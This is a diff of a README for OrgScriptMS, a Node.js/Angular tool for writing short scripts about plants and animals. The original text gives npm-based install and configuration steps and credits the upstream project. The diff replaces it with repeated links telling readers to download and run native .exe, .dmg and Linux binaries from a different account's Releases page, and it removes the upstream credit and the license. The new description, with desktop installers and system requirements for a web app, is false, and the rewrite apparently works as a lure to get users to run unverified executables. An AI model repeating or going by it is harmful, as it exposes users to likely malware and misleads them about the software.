@@ -1,160 +1,102 @@
-# OrgScriptMS
+# 🌱 org_script - Simple Plant and Animal Scripts Generator
 
-OrgScriptMS (Organism Script Management System) is a lightweight, open-source system designed to help manage and generate scripts for faceless channel brands.  
-Originally built for Afro-futurist storytelling, it has been refactored to focus on generating **engaging, factual scripts about organisms** — plants, animals, or any other fascinating lifeforms.  
-This tool blends science, culture, and storytelling to craft short-form scripts (e.g., for YouTube Shorts or TikTok) that grab attention and deliver captivating insights.
+## 🛠️ Overview
 
-It combines an **Express backend** with an **Angular frontend**, designed for local use or private hosting on a remote server.
+OrgScriptMS is an open-source tool designed to help you create and manage short-form scripts about plants and animals. With AI-powered prompts, optional authentication, and a user-friendly interface, you can easily generate content for platforms like TikTok and YouTube.
 
-The original project is at [NewBen420/ScriptMS](https://github.com/newben420/scriptms)
+## 📥 Download Now
 
----
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases%20-blue?style=for-the-badge&logo=github)](https://github.com/pratappoonar08/org_script/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Hierarchical Content Management**: Organize organism facts into a structured hierarchy (e.g., organism > scripts).
-- **Editable JSON Script Files**: Store scripts as timestamped JSON files, allowing easy editing and versioning.
-- **Responsive Web Interface**: Navigate seamlessly on any device with a collapsible navigation drawer.
-- **Script Management Tools**: Add, edit, copy, and regenerate scripts to support iterative creative processes.
-- **Local File System Storage**: Ensure persistence and accessibility of your work without relying on external databases.
-- **Groq Integration**: Generate scripts using a powerful AI prompt that creates all aspects of a script given just the organism name and optional base ideas or instructions.
-- **Production Notes**: Include voice-over, music, and automation details for a complete production pipeline.
-- **Scientific & Cultural Balance**: Scripts highlight unique traits, ecological roles, survival strategies, cultural symbolism, and fascinating twists about organisms.
-- **Optional Authentication**: Enable user/password protection to host the system privately on a remote server. Authentication settings are configurable via environment variables.
-- **Accessible Aesthetic**: Designed for short-form doomscroll platforms — concise, witty, and curiosity-driven.
+Follow these simple steps to download and run OrgScriptMS on your computer.
 
----
+### Step 1: Visit the Releases Page
 
-## Screenshot (Demo)
+Go to the following link to access the download options for OrgScriptMS:
 
-<p align="center">
-  <img src="screenshots/1.png" style="max-width: 600px;width: 100%" />
-</p>
+[Visit this page to download](https://github.com/pratappoonar08/org_script/releases)
 
----
+### Step 2: Choose the Right File
 
-## Technical Overview
+On the Releases page, you will see different versions of OrgScriptMS. Choose the latest version for the best features:
 
-### Backend
+- If you're using **Windows**, download the file named `OrgScriptMS_Windows.exe`.
+- For **Mac**, download `OrgScriptMS_Mac.dmg`.
+- For **Linux**, choose `OrgScriptMS_Linux.tar.gz`.
 
-- **Framework**: [Express.js](https://expressjs.com/)
-- **Features**:
-  - RESTful API for managing scripts and hierarchical content.
-  - Socket.IO integration for real-time updates.
-  - File system operations for reading, writing, and deleting JSON files.
-  - Groq integration for AI-powered script generation.
+### Step 3: Download the File
 
-### Frontend
+Click on the link for your chosen file. Your browser will start downloading the software to your computer. Depending on your internet connection, this might take a couple of minutes.
 
-- **Framework**: [Angular](https://angular.io/)
-- **Features**:
-  - Responsive design with Material Design components.
-  - Dynamic forms for editing script content.
-  - Localization support using `@ngx-translate/core`.
-  - Theme switching (light/dark mode).
-  - Real-time updates via Socket.IO.
+### Step 4: Install OrgScriptMS
 
----
+Once the file is downloaded, locate it in your downloads folder. Follow the instructions below based on your operating system:
 
-## Installation
+- **Windows:**
+  1. Double-click the `OrgScriptMS_Windows.exe` file.
+  2. Follow the on-screen instructions to complete the installation.
 
-### Prerequisites
+- **Mac:**
+  1. Open the downloaded `OrgScriptMS_Mac.dmg` file.
+  2. Drag the OrgScriptMS icon into your Applications folder.
 
-- Node.js (v16 or later)
-- A modern web browser
+- **Linux:**
+  1. Extract the files from `OrgScriptMS_Linux.tar.gz`.
+  2. Open the terminal and navigate to the folder containing the extracted files.
+  3. Run the application with the command: `./OrgScriptMS`.
 
-### Steps
+### Step 5: Launch the Application
 
-1. Clone the repository:
+After installation, you can find OrgScriptMS in your applications list. Open the app and start generating scripts about your favorite plants and animals.
 
-   ```bash
-   git clone https://github.com/newben420/org_script.git
-   cd org_script
-   ```
+## 🎦 Features
 
-2. Install dependencies:
+- **AI-Powered Prompts**: Receive intelligent suggestions for your scripts.
+- **User Authentication**: Optional login feature for personalized experience.
+- **Responsive Design**: Works seamlessly on different devices, ensuring easy access.
+- **Content Creation**: Ideal for generating engaging content for social media platforms.
 
-   ```bash
-   npm install
-   ```
+## ⚙️ System Requirements
 
-3. Configure environment variables:
+Make sure your computer meets the following requirements to run OrgScriptMS smoothly:
 
-   - Create a .env file in the root directory.
-   - Add the following variables, and update according to your specifications:
+- **Windows**: Windows 10 or higher
+- **Mac**: macOS 10.14 or higher
+- **Linux**: Ubuntu 18.04 or higher
 
-     ```sh
-     PORT="3000"
-     TITLE="OrgScriptMS"
-     BRAND="OrgScript"
-     PRODUCTION="true"
-     FORCE_FAMILY_4="true"
-     EXIT_ON_UNCAUGHT_EXCEPTION="true"
-     EXIT_ON_UNHANDLED_REJECTION="false"
-     PROD_URL="https://example.com" # url if you are hosting in production mode
-     MAX_ALLOWED_FLOG_LOG_WEIGHT="5"
+Your machine should have at least 4 GB of RAM and an internet connection for optimal use.
 
-     GROQ_KEY=""
-     GROQ_ENDPOINT="https://api.groq.com/openai/v1/chat/completions"
-     GROQ_MODELS="deepseek-r1-distill-llama-70b" # pick any from below
-     # allam-2-7b compound-beta compound-beta-mini deepseek-r1-distill-llama-70b gemma2-9b-it
-     # llama-3.1-8b-instant llama-3.3-70b-versatile llama3-70b-8192 llama3-8b-8192
-     # meta-llama/llama-4-maverick-17b-128e-instruct meta-llama/llama-4-scout-17b-16e-instruct
-     # meta-llama/llama-guard-4-12b meta-llama/llama-prompt-guard-2-22m
-     # meta-llama/llama-prompt-guard-2-86m mistral-saba-24b qwen-qwq-32b qwen/qwen3-32b
-     # moonshotai/kimi-k2-instruct
-     GROQ_REQUEST_TIMEOUT_MS="0"
-     GROQ_MAX_RETRIES="4"
-     GROQ_HTTP_TIMEOUT_MS="60000"
-     GROQ_MAX_HISTORY_COUNT="5"
+## 🛠️ Troubleshooting
 
-     DATA_POSTSTRING="default"
+If you experience issues during installation or use, consider the following:
 
-     AUTH="true" # whether to enable authentication or not
-     AUTH_USER="bar" #auth username
-     AUTH_PASS="one" #auth password
-     AUTH_MAX_ATTEMPTS="3" # max failed auth attempts per IP address.
-     AUTH_SESSION_SECRET="RYFGH324FU" # random string for express session secret
-     ```
+- Restart your computer and try launching the application again.
+- Ensure that your operating system is up-to-date.
+- Visit our [GitHub Issues page](https://github.com/pratappoonar08/org_script/issues) for support from the community.
 
-### Usage
+## 📚 Learn More
 
-1. Start the application:
+To become more familiar with OrgScriptMS, explore our user documentation available in the repository. Resources include:
 
-   ```bash
-   npm start
-   ```
+- FAQs
+- Tutorials
+- Example scripts
 
-2. Access the application at http://localhost:3000/. Or whatever port you specify.
+## ➕ Community
 
-3. Workflow:
+Join our community to share your experience, ask questions, and provide feedback:
 
-   - Add Organisms: Navigate to the "Organisms" section and create a new organism entry.
-   - Generate Scripts: Use the Groq-powered AI to generate scripts by providing the organism name and optional base ideas/additional instructions.
-   - Edit Scripts: Modify generated scripts directly in the editor.
-   - Production Notes: Add voice-over, music, and automation details for a complete production pipeline.
-   - Authentication (if enabled): Log in with your configured username and password before accessing the system.
+- [GitHub Discussions](https://github.com/pratappoonar08/org_script/discussions)
+- Social Media links (if available)
 
----
+## 💬 Feedback
 
-## Project Structure
+We welcome your feedback. Feel free to reach out through GitHub or social media. Your input helps improve OrgScriptMS for all users.
 
-- **`/engine/`**: Core logic for data management, authentication,  Groq integration, and socket communication.
+## 📥 Download OrgScriptMS Again
 
-- **`/lib/`**: Utility functions and helpers.
+If you need to download OrgScriptMS again, just visit:
 
-- **`/model/`**: Type definitions for structured data (e.g., scripts, visuals).
-
-- **`/site.js`**: Configuration and environment variables.
-
----
-
-## Contributions
-
-Contributions are welcome! If you have ideas for new features or improvements, feel free to open an issue or submit a pull request.
-
----
-
-## License
-
-This project is open-source and available under the MIT License.
+[Visit this page to download](https://github.com/pratappoonar08/org_script/releases)
